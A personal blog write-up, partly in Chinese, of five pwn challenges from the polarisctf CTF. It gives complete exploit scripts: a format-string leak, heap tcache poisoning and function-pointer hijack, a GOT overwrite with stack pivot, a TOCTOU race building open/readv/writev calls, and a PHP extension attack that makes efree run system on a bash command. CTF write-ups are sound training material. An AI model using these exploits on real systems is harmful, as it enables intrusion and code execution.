---
title: polarisctf
date: 2026-03-29 11:19:54
tags: [pwn]
categories: [CTF,polarisctf]
---

# ez_nc

爆破一下

首先这样爆了一遍

```python
context.log_level = 'debug'

for i in range(0, 100):
    try:

        io = remote('nc1.ctfplus.cn', 20329)

        io.recvuntil(b"Enter the filename to download: ")

        payload = f"%{i}$s".encode()
        io.sendline(payload)

        res = io.recvuntil(b'\n')

        print(f"Offset [{i}]: {res}")

        io.close()
    except EOFError:

        print(f"Offset [{i}]: [Crash / Invalid Pointer]")
    except Exception as e:
        continue
```

然后发现%45的位置有东西没读完

```python
from pwn import*

context.log_level = 'debug'

sla = lambda x,s:p.sendlineafter(x,s)
sl = lambda s:p.sendline(s)
sa = lambda x,s:p.sendafter(x,s)
s = lambda s:p.send(s)

p = remote('nc1.ctfplus.cn',20329)

pay = b'%45$s'

sl(pay)

p.recv(0x1000)

p.interactive()
```

读一下就能发现flag

善用recvall函数啊（（（

我完全忘记还有一个recvall了，只记得recv和recvuntil

# ez_heap

很不好看的ida

ai分析一下各个函数吧，，，

然后稍微修一下函数名勉强能看一点（（（

原来是给ai写的题。。

那不奇怪了。。

写了半截exp然后丢给ai让它补全。于是拿到flag了。拿到flag了。好虚幻。像做梦一样。

```python
from pwn import *

filename = './inference_forge'
e = ELF(filename)
context(arch=e.arch, os=e.os)
context.log_level = 'debug'

# io = process(filename)
io = remote('nc1.ctfplus.cn',19284)

def register_artifact(items, stride):
    io.sendlineafter(b"gateway> ", b"1")
    io.sendlineafter(b"manifest.items(u32)> ", str(items).encode())
    io.sendlineafter(b"manifest.stride(u32)> ", str(stride).encode())

def stream_chunk(offset, hex_payload):
    io.sendlineafter(b"gateway> ", b"2")
    io.sendlineafter(b"stream.offset> ", str(offset).encode())
    io.sendlineafter(b"stream.payload.hex> ", hex_payload)

def bootstrap_scheduler():
    io.sendlineafter(b"gateway> ", b"3")

def allocate_session(slot, tensor_bytes, alias):
    io.sendlineafter(b"gateway> ", b"5")
    io.sendlineafter(b"session.slot(0-15)> ", str(slot).encode())
    io.sendlineafter(b"session.tensor_bytes> ", str(tensor_bytes).encode())
    io.sendlineafter(b"session.alias> ", alias)

def complete_inference(slot):
    io.sendlineafter(b"gateway> ", b"6")
    io.sendlineafter(b"session.slot> ", str(slot).encode())

def patch_metadata(slot, qword_index, qword_value):
    io.sendlineafter(b"gateway> ", b"7")
    io.sendlineafter(b"diag.session.slot> ", str(slot).encode())
    io.sendlineafter(b"diag.qword_index> ", str(qword_index).encode())
    io.sendlineafter(b"diag.qword_value(u64)> ", str(qword_value).encode())

def provision_worker(cpu, mem, io_weight, latency, replicas, region, memo):
    io.sendlineafter(b"gateway> ", b"8")
    io.sendlineafter(b"worker.cpu_quota> ", str(cpu).encode())
    io.sendlineafter(b"worker.mem_quota> ", str(mem).encode())
    io.sendlineafter(b"worker.io_weight> ", str(io_weight).encode())
    io.sendlineafter(b"worker.latency_slo> ", str(latency).encode())
    io.sendlineafter(b"worker.replicas> ", str(replicas).encode())
    io.sendlineafter(b"worker.region_code> ", str(region).encode())
    io.sendlineafter(b"worker.memo> ", memo)

def dispatch_task(task_id):
    io.sendlineafter(b"gateway> ", b"9")
    io.sendlineafter(b"queue.task_id> ", str(task_id).encode())

def telemetry():
    io.sendlineafter(b"gateway> ", b"10")

# ==========================================
# 阶段 1：信息泄露与控制平面初始化
# ==========================================
telemetry()
io.recvuntil(b'diag.audit_sink=0x')
backdoor = int(io.recv(12), 16)
log.success(f"[*] Backdoor Win Address: {hex(backdoor)}")

# 触发整数溢出，分配出我们的“越界写炮台” (Arena)
register_artifact(1073741824, 4)

# 初始化调度器。此时 Control Plane 和 Task 0 会紧贴着我们的 Arena 分配
bootstrap_scheduler()

# ==========================================
# 阶段 2：越界写 (OOB) 瘫痪安全策略
# ==========================================
# 偏移 56 刚好对应 Control Plane 里的 strict_policy 字段
# 我们发送 8 个十六进制的 00 (等同于 \x00)，将其关闭
stream_chunk(56, b"00" * 8)
log.success("[*] strict_policy overwritten to 0")

# ==========================================
# 阶段 3 & 4：凑够 Tcache Count，制造 UAF 并投毒
# ==========================================

# 分配【两个】会话，为了让 Tcache 的 Count = 2
allocate_session(0, 32, b"PWN0")
allocate_session(1, 32, b"PWN1")

telemetry()
# 提取出 Session 1 的地址（因为它是后释放的，将位于链表头部，我们要对它投毒）
io.recvuntil(b'[session:1] handle=0x')
session1_addr = int(io.recv(12), 16)

io.recvuntil(b"[scheduler.head] desc=0x")
task0_addr = int(io.recv(12), 16)

log.info(f"[*] Session 1 Chunk: {hex(session1_addr)}")
log.info(f"[*] Task 0 Target: {hex(task0_addr)}")

# 释放顺序很关键！先放 0，再放 1。这样 Tcache 头部就是 Session 1。
complete_inference(0)
complete_inference(1)

# 计算 Mangled FD (使用 Session 1 的地址作为 Key)
key = session1_addr >> 12
mangled_fd = task0_addr ^ key

# 利用选项 7，对处于链表头部的 Session 1 投毒
patch_metadata(1, 0, mangled_fd)
log.success(f"[*] Tcache Poisoned! Count is now 2.")

# ==========================================
# 阶段 5：连续分配，霸占 Task 0
# ==========================================

# 第一次调用：消耗掉 Session 1，Count 变成 1。链表头部变成了 Task 0。
provision_worker(1, 1, 1, 1, 1, 1, b"CONSUME_SESSION_1")

# 第二次调用：成功拿到 Task 0！
# 选项 8 中的 latency_slo 参数在结构体里刚好是 offset 24
# 我们把 backdoor 地址传给它，完美覆盖原本的 handler 函数指针！
provision_worker(1, 1, 1, backdoor, 1, 1, b"OVERWRITE_TASK_0")
log.success("[*] Task 0 Handler hijacked successfully!")

# ==========================================
# 阶段 6：处决执行
# ==========================================
dispatch_task(0)

io.interactive()
```

# treasure

要是这道题的难度标注是easy我就写先写这题了（（

这题的难度标注应该是简单的（（

就是一个改got表

有个呃那个东西叫数组吗反正就是可以几乎任意地址写

然后有一个可控的rsp什么的

用一个算栈迁移吧算一点

拿到shell

```python
from pwn import*
filename = './pwn-treasure'
libc = './libc.so.6'

e = ELF(filename)
libc = ELF(libc)
context(arch=e.arch,os=e.os)
context.log_level = 'debug'

sla = lambda x,s:p.sendlineafter(x,s)
sl = lambda s:p.sendline(s)
sa = lambda x,s:p.sendafter(x,s)
s = lambda s:p.send(s)

p = process(filename)
# gdb.attach(p)
p = remote('nc1.ctfplus.cn',34686)

sla(b'password: ',b'0')
sla(b"Which one?\n", b"-9")

s(b"\x58")
p.recvuntil(b'the context: ')

pie = u64((p.recv(6)).ljust(8,b'\x00'))

pie = pie - 0x4058

backdoor = pie + 0x139d
pop_rbp_ret = pie + 0x00000000000011f3
ret = pie + 0x000000000000101a
lea_ret = pie + 0x00000000000012b1


print(hex(pie))
print(hex(backdoor))

payload_name = p64(ret) + p64(backdoor)
sla(b"tell me your name", payload_name )

printf_got = pie + 0x48D8

target_idx = 0x48D8 - 0x40A0

true_idx = target_idx // 8

target_idx = true_idx - (1 << 63)

offset = 0x48d8 - 0x40a0

main = pie + 0x12b3

_sthread = pie + 0x40A0

print(hex(printf_got))
print(hex(_sthread))
print(hex(main))



sla(b"Last time!Lucky, guy!", str(-13).encode())
# pause()
s(p64(pop_rbp_ret))

key = pie + 0x1209

sl(b'/bin/sh\x00')

# sla(b'Which one?',p64(backdoor))

p.interactive()
```

# Throne_Hazard

TOCTOU（Time-of-Check to Time-of-Use）

有一个改结构体然后任意读写任意调用

然后orw

```python
from multiprocessing import Event, Process, Lock, Value
import os
from pwn import *
filename = './pwn'
libcname = './libc.so.6'
host = '127.0.0.1'
port = 9999

context.log_level='debug'

if os.path.exists(filename):
    e = ELF(filename, checksec=False)
    context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
if os.path.exists(libcname):
    global libc
    libc = ELF(libcname, checksec=False)

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)
libgad = lambda code : libc.search(code, executable=True).__next__()



def run(script = "", mode = 'a'):
    global p

    if len(sys.argv) >= 2:
        mode = sys.argv[1]

    if "d" in mode:
        p = gdb.debug(filename, script, aslr=False)
    elif "l" in mode:
        p = process(filename)
    elif "r" in mode:
        p = remote(host, port)
    elif "a" in mode:
        p = process(filename)
        gdb.attach(p)
    return p



def worker(stop_event, lock, counter):

    while not stop_event.is_set():
        try:
            counter.value += 1
            pwn(stop_event)
            context.log_level = 'debug'
            log.info(f"Success! Tried {counter.value} times.")
            with lock:
                p.interactive()
            p.close()
            continue
        except:
            p.close()
            pass



def brute_multi(process_num):
    context.log_level = 'error'
    stop_event, lock, counter= Event(), Lock(), Value("i", 0)
    jobs = []
    for _ in range(process_num):
        process = Process(target=worker, args=(stop_event, lock, counter))
        jobs.append(process)
        process.start()
    try:
        while not stop_event.is_set():
            time.sleep(0.5)   
        for process in jobs:
            process.join()
    except KeyboardInterrupt:
        stop_event.set()
        for process in jobs:
            process.terminate()



script = '''
c
'''

# =========================================================================
# 交互函数定义区
# =========================================================================

def calibrate(target_val):
    '''功能1，设置 self-optimizer target 的目标值 (最大0x78)'''
    sla(b"> ", b"1")
    sla(b"appeal target (0x20-0x78)> ", str(target_val).encode())

def forge_capsule(primer: bytes, stream_data: bytes):
    '''功能2，分配大小为0x30的Capsule堆块，并写入1字节primer和不定长的stream数据 (用于触发条件竞争溢出)'''
    sla(b"> ", b"2")
    x = p.recvline(timeout=0.5)
    if b'cycle' in x:
        p.interactive()
        return False

    print(x)
    s(primer)
    # 注意：这里的 prompt 带有动态计算的长度，如 "forge stream (0x87 bytes left)> "，因此只匹配前半部分
    p.recvuntil(b"forge stream (")
    nbytes = int(p.recvuntil(' bytes', drop=True), 16)
    if nbytes == 0x2f: result = False
    else: result = True
    if result:
        sa('left', stream_data.ljust(nbytes, b'\x00'))
    else:
        sa('left', 'a'*nbytes)
    return result

def build_actuator():
    '''功能3，分配大小为0x48的Actuator堆块并初始化内部字段'''
    sla(b"> ", b"3")

def tune_seed(data: bytes):
    '''功能4，向Actuator的内部缓冲区写入最多32字节的数据'''
    sla(b"> ", b"4")
    sla(b"seed line> ", data)

def compose_broadcast(data: bytes):
    '''功能5，向BSS段(0x404160)写入最多128字节的数据 (用于触发单字节溢出/Off-by-Null)'''
    sla(b"> ", b"5")
    sla(b"broadcast line> ", data)

def dispatch():
    '''功能6，触发Actuator的执行流，调用 funcs_401588[lane]'''
    sla(b"> ", b"6")

def review():
    '''功能7，打印当前竞技场的全局状态信息，可用于泄露或观察状态'''
    sla(b"> ", b"7")

def exit_console():
    '''功能8，退出程序'''
    sla(b"> ", b"8")

def race_overflow(payload):
    ## 这里是开了一个竞争
    calibrate(len(payload)-16)
    while not forge_capsule(b'1', payload[1::]):
        pass
    return


def pwn(stop_event = Event()):
    p = run(script)
    # review()
    forge_capsule(b'0', b'x'*0x2f)
    build_actuator()
    payload = b'x'*0x38+p64(0x11)+b'x'*0x10+p64(0)+p64(8)+p64(e.got['puts'])
    race_overflow(payload)

    review()
    dispatch()
    p.recvuntil('[dispatch lane 0]\n')

    libcbase = u64(p.recv(8))-libc.sym['puts']
    print(hex(libcbase))
    pause()

    libc.address = libcbase

    lea_ret = libcbase + 0x000000000004da83

    payload = b'x'*0x38+p64(0x11)+b'x'*0x10+p64(1)+p64(8)+p64(0x4040f8)
    race_overflow(payload)
    dispatch()

    s(p64(libc.sym['open']))


    # pay = p64(0x4041a0)  # 0x404160
    # pay += p64(0x80) # 0x404168
    # pay += 6*p64(0) # 0x404170-8
    # pay += b'/flag\x00'

    pay = p64(0x4041c0)  # 0x404160: 第 1 个 iovec (指向末尾的 0x4041c0)
    pay += p64(0x50)     # 0x404168: 长度 0x50 足够放 flag 了

    # 填充 80 个字节的 0，相当于连续放置了 5 个空的 iovec 结构体
    # 足以应付 RDX 残留为 1~6 的任何情况！
    pay += p64(0) * 10   # 0x404170 - 0x4041bf: 填满空位

    # 最后 16 字节放目标字符串
    pay += b'./flag\x00'

    compose_broadcast(pay)



    payload = b'x'*0x38+p64(0x11)+b'x'*0x10+p64(3)+p64(0)+p64(0x4041c0)
    race_overflow(payload)
    dispatch()
    pause()


    payload = b'x'*0x38+p64(0x11)+b'x'*0x10+p64(1)+p64(8)+p64(0x4040f8)
    race_overflow(payload)
    dispatch()
    s(p64(libc.sym['readv']))
    print("readv")
    pause()

    # 6. 触发执行 readv(3, 0x404160)
    # lane=3, arg2(RSI)=0x404160, arg1(RDI)=3
    payload = b'x'*0x38+p64(0x11)+b'x'*0x10+p64(3)+p64(0x404160)+p64(3)
    race_overflow(payload)
    dispatch()
    p.recvuntil(b'[dispatch complete]\n')

    pause()

    # 7. 覆盖 TABLE3 (lane 3) 为 writev 函数
    payload = b'x'*0x38+p64(0x11)+b'x'*0x10+p64(1)+p64(8)+p64(0x4040f8)
    race_overflow(payload)
    dispatch()
    s(p64(libc.sym['writev']))
    print("写writev")
    pause()

    # 8. 触发执行 writev(1, 0x404160)
    # lane=3, arg2(RSI)=0x404160, arg1(RDI)=1
    payload = b'x'*0x38+p64(0x11)+b'x'*0x10+p64(3)+p64(0x404160)+p64(1)
    race_overflow(payload)
    dispatch()

    pause()

    # print(p.recvall(timeout=1))




pwn()
p.interactive()
```

# ph

这道题其实也是easy

但是

但是

我最开始不会调php题

很痛苦地调试了半天。

感谢diemi学长营救。

首先使用

```php
<?php include "/proc/self/maps"; ?>
```

把各个库的基地址拿到

然后就是一个类似tecache attach

但是完全没有限制就是了

```php
<?php
function p64($val) {
    return chr($val & 0xff) .
           chr(($val >> 8) & 0xff) .
           chr(($val >> 16) & 0xff) .
           chr(($val >> 24) & 0xff) .
           chr(($val >> 32) & 0xff) .
           chr(($val >> 40) & 0xff) .
           chr(($val >> 48) & 0xff) .
           chr(($val >> 56) & 0xff);
}

$libc_base = 0x7ffff7048000;
$system_offset = 0x53110;
$vuln_base = 0x7ffff60f4000;
$efree_offset = 0x4050;

add(1, 0x50);
edit(1, "bash -c '/readflag > ./3.php'\x00");

add(0, 0x220);
edit(0, "qwertyuiopasdfghjklzxcvbnm");
delete(0);
// 0x7ffff626f008
edit(0, p64($vuln_base + $efree_offset)."gminge");


add(2, 0x220);

add(3, 0x220);

edit(3, p64($system_offset + $libc_base));

// while(1){};

delete(1);

while(1){};
?>
```
